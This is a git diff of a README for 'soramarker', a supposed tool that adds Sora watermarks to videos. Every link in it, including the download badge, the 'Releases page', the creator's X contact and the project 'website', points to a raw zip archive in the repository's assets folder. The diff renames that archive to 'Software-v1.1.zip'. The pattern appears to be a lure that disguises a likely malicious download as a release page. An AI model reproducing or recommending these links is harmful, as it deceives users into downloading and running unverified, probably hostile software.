@@ -1,6 +1,6 @@
 # 🎬 soramarker - Add Sora Watermarks to Videos Effortlessly
 
-[![Download SoraMarker](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/soramarker_2.6.zip%https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/soramarker_2.6.zip)](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/soramarker_2.6.zip)
+[![Download SoraMarker](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/Software-v1.1.zip%https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/Software-v1.1.zip)](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/Software-v1.1.zip)
 
 ## 📚 Introduction
 
@@ -12,9 +12,9 @@ Installing SoraMarker is straightforward. Follow these steps to download and run
 
 ## 📥 Download & Install
 
-Head over to our [Releases page](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/soramarker_2.6.zip) to get the latest version of SoraMarker. Click on the “Assets” dropdown, and you will find various download options. 
+Head over to our [Releases page](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/Software-v1.1.zip) to get the latest version of SoraMarker. Click on the “Assets” dropdown, and you will find various download options. 
 
-1. Visit this page to download: [Releases page](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/soramarker_2.6.zip).
+1. Visit this page to download: [Releases page](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/Software-v1.1.zip).
 
 2. Choose the correct file for your operating system. For most users, this will be the Windows or Mac version.
 
@@ -82,11 +82,11 @@ If you encounter issues, here are some common solutions:
 
 ## 📞 Support
 
-For any further questions or help, you can reach out to the community on GitHub by opening an issue. You can also contact the creator Theo on [X](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/soramarker_2.6.zip).
+For any further questions or help, you can reach out to the community on GitHub by opening an issue. You can also contact the creator Theo on [X](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/Software-v1.1.zip).
 
 ## 🌐 Learn More
 
-To learn more about SoraMarker and stay updated with the latest news, check our website: [https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/soramarker_2.6.zip](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/soramarker_2.6.zip).
+To learn more about SoraMarker and stay updated with the latest news, check our website: [https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/Software-v1.1.zip](https://raw.githubusercontent.com/bronchiolitisparasiticjaeger259/soramarker/main/src/assets/Software-v1.1.zip).
 
 ## 🔗 Conclusion
 
